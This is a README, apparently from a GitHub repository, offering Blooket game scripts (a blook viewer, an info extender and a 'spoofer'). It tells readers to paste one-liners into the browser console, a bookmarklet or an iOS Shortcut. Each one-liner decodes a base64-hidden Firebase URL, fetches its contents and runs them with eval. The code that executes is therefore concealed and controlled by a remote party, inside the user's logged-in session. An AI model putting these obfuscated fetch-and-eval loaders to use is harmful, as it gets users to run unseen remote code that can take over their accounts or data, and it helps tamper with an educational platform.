
# Blooket Stuff - JS

# blookViewer.js
### See other people's blooks in the form of your own blook page
</br>

Open console (ctrl + shift + j) and paste the following:

```js
fetch(atob('aHR0cHM6Ly9ibG9va2V0LTM0NGM5LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ibG9va1ZpZXdlci5qc29u')).then((r) => r.text().then((t)=>eval(JSON.parse(t))))
```


# blookInfoExtender.js
### Show extended info on all of the blooks
</br>

```js
fetch(atob('aHR0cHM6Ly9ibG9va2V0LTM0NGM5LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ibG9va0luZm9FeHRlbmRlci5qc29u')).then((r) => r.text().then((t)=>eval(JSON.parse(t))))
```

# spoofer.js
### Show all of the blooks in your blook page along with custom ones as a special rarity

</br>

Open console (ctrl + shift + j) and paste the following:

```js
fetch(atob('aHR0cHM6Ly9ibG9va2V0LTM0NGM5LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9zcG9vZmVyLmpzb24=')).then((r) => r.text().then((t)=>eval(JSON.parse(t))))
```

## IOS Mobile Devices
Install the shortcuts app through app store (if not already built into device)
Open up app
- Tap on the left tab that says 'Sharesheets'
![F87F7B65-0413-4027-98CF-FBBAB9315790](https://user-images.githubusercontent.com/82774618/143507853-bf8b4ebd-e848-47de-b6a5-2c85deb4a974.jpeg)

- Click the plus sign in the top of the screen (+ icon)
![B2805D19-0D45-4097-ABD4-0B3A9665EC26](https://user-images.githubusercontent.com/82774618/143507877-2ce7531f-3e73-48ac-9fa5-385aab7118eb.jpeg)

- Change the 'Accepts' box to only safari web pages
![3E7BE1A6-5EC5-45DC-8FA3-C163330980DA](https://user-images.githubusercontent.com/82774618/143507962-1fd8ae2b-81dd-4dd6-8936-09c3aa1361f9.jpeg)

- Go into the left box and tap on 'Web', scroll until you find 'Run JavaScript On WebPage'
- Drag out box
![11FABDE7-A552-4DED-8BC2-F0C31805BC36](https://user-images.githubusercontent.com/82774618/143508048-a5b887ff-9c15-47d8-bd50-2a5fb14a078a.jpeg)

- Replace contents with below
```js
// clipboard variable here
window.setTimeout(alert, 1, 'Javascript Input Executed.');
completion("Done.");
```
![D38FCE82-5660-42E6-90DC-2E152ADDB7ED](https://user-images.githubusercontent.com/82774618/145502962-9b43a684-1552-48f5-bf16-2cb75b001c04.jpeg)

- Open up safari, copy the code from the js file, and head to blooket 
- Go to correct page for script
- Tap on the share icon in the top right corner, scroll until you see your shortcut, and run it
![C21BCA66-6269-4E6C-82E4-CE4DD131D718](https://user-images.githubusercontent.com/82774618/143508281-9d6aa128-85c5-4b18-8536-31130bff9c37.jpeg)

### Note! This will work with all scripts and other javascript, so don't delete the shortcut when you're done.


## Bookmarklets 
- Go to any page and create a new bookmark with the favorite icon (star)
- Replace bookmark url with `javascript:`
- Paste fetch script from above 
### When you finish it should look something like:
*`javascript:fetch(atob('base64string')).then((r) => r.text().then(eval))`*
<br>
To run it, head to blooket and click the bookmark



## Issues & Bugs
- Check for any mistakes you may have made 
- If you are certain it is a problem with the code, go to the [**`Issues`**](https://github.com/GooseterV/Blooket/issues/new) tab of the repo and create a new issue
